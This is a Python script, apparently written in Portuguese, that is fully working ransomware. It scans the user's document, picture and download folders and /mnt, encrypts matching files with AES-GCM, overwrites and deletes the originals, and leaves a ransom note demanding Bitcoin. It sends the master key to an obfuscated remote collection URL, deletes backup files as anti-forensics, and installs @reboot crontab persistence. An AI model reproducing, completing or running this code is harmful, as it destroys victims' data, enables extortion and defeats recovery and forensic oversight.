import os
import sys
import time
import stat
import json
import struct
import base64
import secrets
import logging
import tempfile
import subprocess
import re
from pathlib import Path
from typing import List, Optional, Set, Dict, Any

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from filelock import FileLock
import requests


def enumerar_arquivos_alvo(
    profundidade_maxima: Optional[int] = None,
    timeout_segundos: Optional[float] = None,
    tamanho_min_bytes: Optional[int] = None,
    tamanho_max_bytes: Optional[int] = None,
) -> List[str]:
    """
    Varre recursivamente diretórios-alvo e retorna caminhos absolutos de arquivos
    com extensões específicas, lidando com permissões e links simbólicos de forma
    segura.

    Diretórios pesquisados (expandidos a partir do usuário):
      - ~/Documentos_Teste
      - ~/Documentos
      - ~/Área de Trabalho
      - ~/Imagens
      - ~/Downloads
      - /mnt

    Extensões capturadas:
      .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar

    Comportamento:
      - Ignora diretórios inacessíveis ou links simbólicos para diretórios.
      - Segue links simbólicos de arquivos quando válidos e legíveis.
      - Normaliza caminhos para evitar duplicatas (realpath absoluto).
      - Respeita limite de profundidade (nível 0 = raiz do diretório-alvo).
      - Encerra varredura global se timeout for atingido.
      - Filtra arquivos por tamanho em bytes quando limites são fornecidos.

    Args:
        profundidade_maxima: Profundidade máxima de recursão (>= 0). None = sem limite.
        timeout_segundos: Tempo global de execução em segundos. None = sem timeout.
        tamanho_min_bytes: Tamanho mínimo do arquivo em bytes (inclusivo).
        tamanho_max_bytes: Tamanho máximo do arquivo em bytes (inclusivo).

    Returns:
        List[str]: Lista de caminhos absolutos válidos, sem duplicatas, ordenados.
    """
    EXTENSOES_VALIDAS: Set[str] = {
        ".xlsx", ".docx", ".pdf", ".txt", ".csv",
        ".jpg", ".png", ".db", ".backup", ".psd", ".zip", ".rar",
    }

    BASES: List[str] = [
        os.path.expanduser("~/Documentos_Teste"),
        os.path.expanduser("~/Documentos"),
        os.path.expanduser("~/Área de Trabalho"),
        os.path.expanduser("~/Imagens"),
        os.path.expanduser("~/Downloads"),
        "/mnt",
    ]

    visitados: Set[str] = set()
    resultado: Set[str] = set()
    inicio = time.monotonic()

    for base in BASES:
        raiz = Path(base).expanduser() if "~" in str(base) else Path(base)

        if not raiz.exists():
            sys.stderr.write(f"[ALERTA] Diretório não existe: {raiz}\n")
            continue
        if not raiz.is_dir():
            sys.stderr.write(f"[ALERTA] Ignorado (não é diretório): {raiz}\n")
            continue

        try:
            caminho_absoluto = raiz.resolve(strict=False)
        except OSError:
            sys.stderr.write(f"[ALERTA] Inacessível (resolução): {raiz}\n")
            continue

        pilha = [(caminho_absoluto, 0)]

        while pilha:
            if timeout_segundos is not None and (time.monotonic() - inicio) > timeout_segundos:
                sys.stderr.write("[ALERTA] Timeout global atingido; interrompendo varredura.\n")
                return sorted(resultado)

            dir_atual, nivel = pilha.pop()

            # Verifica profundidade
            if profundidade_maxima is not None and nivel > profundidade_maxima:
                continue

            try:
                entradas = list(dir_atual.iterdir())
            except PermissionError:
                sys.stderr.write(f"[ALERTA] Permissão negada (iterdir): {dir_atual}\n")
                continue
            except OSError:
                sys.stderr.write(f"[ALERTA] Erro de E/S (iterdir): {dir_atual}\n")
                continue

            for entrada in entradas:
                if timeout_segundos is not None and (time.monotonic() - inicio) > timeout_segundos:
                    sys.stderr.write("[ALERTA] Timeout global atingido durante iteração.\n")
                    return sorted(resultado)

                try:
                    # Resolve link simbólico para arquivos; para diretórios não segue.
                    if entrada.is_symlink():
                        alvo = entrada.readlink()
                        try:
                            alvo_abs = (entrada.parent / alvo).resolve(strict=False)
                        except OSError:
                            sys.stderr.write(f"[ALERTA] Link simbólico quebrado: {entrada}\n")
                            continue

                        # Ignora links simbólicos para diretórios
                        if alvo_abs.is_dir():
                            continue

                        candidato = alvo_abs
                    else:
                        candidato = entrada

                    if candidato.is_dir():
                        try:
                            pilha.append((candidato, nivel + 1))
                        except Exception:
                            sys.stderr.write(f"[ALERTA] Erro ao enfileirar diretório: {candidato}\n")
                        continue

                    if not candidato.is_file():
                        continue

                    if candidato.suffix.lower() not in EXTENSOES_VALIDAS:
                        continue

                    # Normaliza caminho absoluto para evitar duplicatas
                    try:
                        caminho_final = candidato.resolve(strict=False)
                    except OSError:
                        sys.stderr.write(f"[ALERTA] Inacessível (resolve): {candidato}\n")
                        continue

                    chave = str(caminho_final)
                    if chave in visitados:
                        continue

                    # Verificação de tamanho
                    try:
                        tamanho = caminho_final.stat().st_size
                    except OSError:
                        sys.stderr.write(f"[ALERTA] Inacessível (stat): {caminho_final}\n")
                        continue

                    if tamanho_min_bytes is not None and tamanho < tamanho_min_bytes:
                        continue
                    if tamanho_max_bytes is not None and tamanho > tamanho_max_bytes:
                        continue

                    visitados.add(chave)
                    resultado.add(chave)

                except Exception as e:
                    sys.stderr.write(f"[ALERTA] Erro processando entrada {entrada}: {e}\n")
                    continue

    return sorted(resultado)


def gerar_e_persistir_chave_mestra(caminho: str = "/tmp/.master.key") -> Optional[bytes]:
    """
    Gera uma chave AES-256 de 32 bytes uma única vez, persiste em formato JSON
    {"aes_key": "<Base64>"} com permissões restritivas e garante idempotência.

    Retorna a chave em bytes se bem-sucedido; caso contrário, retorna None.
    """
    caminho = os.path.expanduser(caminho)

    try:
        if os.path.isfile(caminho):
            try:
                with open(caminho, "r", encoding="utf-8") as arquivo:
                    payload = json.load(arquivo)

                valor = payload.get("aes_key")
                if not isinstance(valor, str):
                    return None

                chave = base64.b64decode(valor, validate=True)
                if len(chave) == 32:
                    return chave
            except (OSError, json.JSONDecodeError, ValueError, TypeError):
                return None

        chave = secrets.token_bytes(32)
        valor_b64 = base64.b64encode(chave).decode("ascii")
        payload = {"aes_key": valor_b64}
        dados = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")

        descritor, temporario = tempfile.mkstemp(dir=os.path.dirname(caminho), prefix=".master.key.tmp.")
        try:
            try:
                with os.fdopen(descritor, "wb") as f:
                    f.write(dados)
                os.chmod(temporario, stat.S_IRUSR | stat.S_IWUSR)
                os.replace(temporario, caminho)
            except Exception:
                try:
                    os.unlink(temporario)
                except OSError:
                    pass
                raise
        except OSError:
            return None

        return chave
    except Exception:
        return None


def _derive_key(master_key: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(master_key)


def criptografar_e_sobrescrever(caminho_arquivo: str, chave_mestra: bytes) -> None:
    if not isinstance(caminho_arquivo, str) or not os.path.isfile(caminho_arquivo):
        raise ValueError("caminho_arquivo deve ser um arquivo existente")
    if not isinstance(chave_mestra, bytes) or len(chave_mestra) == 0:
        raise ValueError("chave_mestra deve ser bytes não vazios")

    caminho_original = os.path.abspath(caminho_arquivo)
    caminho_criptografado = caminho_original + ".wncry"

    try:
        with open(caminho_original, "rb") as f:
            dados_originais = f.read()

        tamanho_original = len(dados_originais)
        if tamanho_original == 0:
            raise ValueError("arquivo original está vazio")

        salt = os.urandom(16)
        chave = _derive_key(chave_mestra, salt)
        nonce = os.urandom(12)

        aesgcm = AESGCM(chave)
        ciphertext = aesgcm.encrypt(nonce, dados_originais, salt)

        with open(caminho_criptografado, "wb") as f:
            f.write(nonce)
            f.write(ciphertext)

        with open(caminho_original, "r+b") as f:
            bloco = b"\x00" * 65536
            blocos_completos = tamanho_original // len(bloco)
            resto = tamanho_original % len(bloco)

            for _ in range(blocos_completos):
                f.write(bloco)
            if resto:
                f.write(b"\x00" * resto)

            f.flush()
            os.fsync(f.fileno())

        os.remove(caminho_original)

    except Exception as e:
        if os.path.exists(caminho_criptografado):
            try:
                os.remove(caminho_criptografado)
            except OSError:
                pass
        raise RuntimeError(f"falha ao processar {caminho_original}: {e}") from e


def gerar_relatorio_e_limpar_chave(diretorios_criptografados: List[str]) -> Dict:
    LEIA_ME = "#_LEIA_ME_WNCRY_#.txt"
    CONTEUDO = (
        "ATENÇÃO - ARQUIVOS SEQUESTRADOS\n"
        "Seus arquivos foram criptografados.\n"
        "Para recuperá-los, pague 300 USD em Bitcoin para:\n"
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
        "Entre em contato via Tor para instruções."
    )
    MASTER_KEY = "/tmp/.master.key"
    import base64 as _b64
    TARGET_URL = _b64.b64decode("aHR0cDovLzEwLjE1MC4zLjE2Mjo4MDgwL2NvbGxlY3Q=").decode()

    resultado: Dict = {
        "status": "ok",
        "caminhos_afetados": [],
        "codigo_http": None,
        "erros": [],
    }

    for d in diretorios_criptografados:
        try:
            caminho_leia_me = os.path.join(d, LEIA_ME)
            if not os.path.exists(caminho_leia_me):
                with open(caminho_leia_me, "w", encoding="utf-8") as f:
                    f.write(CONTEUDO)
            resultado["caminhos_afetados"].append(os.path.abspath(caminho_leia_me))
        except (OSError, PermissionError, IOError):
            resultado["erros"].append(f"escrita_recusada:{d}")
            resultado["status"] = "parcial"

    try:
        if os.path.isfile(MASTER_KEY):
            import socket as _socket
            with open(MASTER_KEY, "r", encoding="utf-8") as f:
                data = json.load(f)
            aes_key = data["aes_key"]
            hostname = _socket.gethostname()
            resp = requests.post(
                TARGET_URL,
                json={"aes_key": aes_key, "hostname": hostname},
                timeout=10,
            )
            resultado["codigo_http"] = resp.status_code
            if resp.status_code == 200:
                if _safe_remove(MASTER_KEY):
                    print("[INFO] Chave mestra exfiltrada e removida com sucesso.")
                else:
                    resultado["erros"].append("remocao_chave_falhou")
                    resultado["status"] = "parcial"
            else:
                resultado["erros"].append(f"exfiltracao_falhou:{resp.status_code}")
                resultado["status"] = "erro"
        else:
            resultado["codigo_http"] = None
            resultado["erros"].append("chave_nao_encontrada")
    except requests.exceptions.RequestException as e:
        resultado["codigo_http"] = getattr(e.response, "status_code", None)
        resultado["erros"].append("erro_rede")
        resultado["status"] = "erro"
    except (OSError, PermissionError, IOError, KeyError, json.JSONDecodeError):
        resultado["erros"].append("erro_io")
        resultado["status"] = "erro"
    except Exception:
        resultado["erros"].append("erro_desconhecido")
        resultado["status"] = "erro"

    return resultado


def _safe_remove(path: str) -> bool:
    try:
        if os.path.isfile(path):
            length = os.path.getsize(path)
            with open(path, "r+b") as f:
                f.write(secrets.token_bytes(length))
                f.flush()
                os.fsync(f.fileno())
            os.remove(path)
        return True
    except Exception:
        return False


def remover_antiforense_e_registrar_servico(caminhos: List[str], linha_crontab: str) -> Dict[str, Any]:
    """
    Remove arquivos residuais (.bak, .backup, .old) e registra entrada @reboot no crontab.
    """
    resultado: Dict[str, Any] = {
        'exclusoes': {},
        'crontab': {'existente': False, 'adicionado': False, 'linha': linha_crontab},
        'erros': []
    }

    extensoes_alvo = {'.bak', '.backup', '.old'}

    # --- Fase 1: Remoção de arquivos residuais ---
    for caminho_str in caminhos:
        caminho = Path(caminho_str).expanduser().resolve()
        removidos = []
        erros_caminho = []

        if not caminho.exists():
            resultado['erros'].append(f'Caminho inexistente: {caminho}')
            continue

        try:
            if caminho.is_file():
                arquivos_iter = [caminho] if caminho.suffix in extensoes_alvo else []
            else:
                arquivos_iter = [
                    p for p in caminho.rglob('*')
                    if p.is_file() and p.suffix in extensoes_alvo
                ]

            for arquivo in arquivos_iter:
                try:
                    arquivo.unlink()
                    print(f'[INFO] Removido: {arquivo}')
                    removidos.append(str(arquivo))
                except Exception as exc:
                    msg = f'Erro ao remover {arquivo}: {exc}'
                    sys.stderr.write(msg + '\n')
                    erros_caminho.append(msg)

        except Exception as exc:
            msg = f'Erro ao processar caminho {caminho}: {exc}'
            sys.stderr.write(msg + '\n')
            erros_caminho.append(msg)

        resultado['exclusoes'][str(caminho)] = {
            'arquivos_removidos': removidos,
            'erros': erros_caminho
        }
        resultado['erros'].extend(erros_caminho)

    # --- Fase 2: Atualização do crontab (idempotente) ---
    try:
        proc = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=30)
        crontab_atual = proc.stdout.splitlines() if proc.returncode == 0 else []

        linha_normalizada = ' '.join(linha_crontab.strip().split())
        if any(linha.strip() == linha_normalizada for linha in crontab_atual):
            resultado['crontab']['existente'] = True
        else:
            crontab_novo = crontab_atual + [linha_normalizada]
            novo_conteudo = '\n'.join(crontab_novo) + '\n'
            proc = subprocess.run(
                ['crontab', '-'],
                input=novo_conteudo, text=True, capture_output=True, timeout=30
            )
            if proc.returncode != 0:
                raise RuntimeError(f'Erro crontab: {proc.stderr}')
            resultado['crontab']['adicionado'] = True
            print(f'[INFO] Crontab atualizado: {linha_normalizada}')

    except Exception as exc:
        msg = f'Erro ao atualizar crontab: {exc}'
        sys.stderr.write(msg + '\n')
        resultado['erros'].append(msg)

    return resultado


if __name__ == "__main__":
    # 1. Gerar e salvar chave mestra
    chave = gerar_e_persistir_chave_mestra("/tmp/.master.key")
    if chave is None:
        sys.exit("[ERRO] Falha ao gerar chave mestra.")
    print(f"[OK] Chave mestra gerada e salva em /tmp/.master.key")

    # 2. Varrer arquivos alvo
    caminhos = enumerar_arquivos_alvo(profundidade_maxima=10, timeout_segundos=30.0)
    print(f"[INFO] {len(caminhos)} arquivo(s) encontrado(s).")

    # 3. Criptografar todos os arquivos com a chave mestra
    dirs_afetados = set()
    for c in caminhos:
        try:
            criptografar_e_sobrescrever(c, chave)
            dirs_afetados.add(os.path.dirname(c))
            print(f"[OK] Criptografado: {c}")
        except Exception as e:
            sys.stderr.write(f"[ERRO] {c}: {e}\n")

    # 4. Gerar nota de resgate APENAS nas pastas onde houve criptografia
    if dirs_afetados:
        resultado_relatorio = gerar_relatorio_e_limpar_chave(list(dirs_afetados))
        print(json.dumps(resultado_relatorio, indent=2))

    # 5. Registrar persistência e remover arquivos residuais
    script_path = str(Path(__file__).resolve())
    resumo = remover_antiforense_e_registrar_servico(
        caminhos=list(dirs_afetados) if dirs_afetados else caminhos,
        linha_crontab=f"@reboot python3 {script_path}"
    )
    print(json.dumps(resumo, indent=2))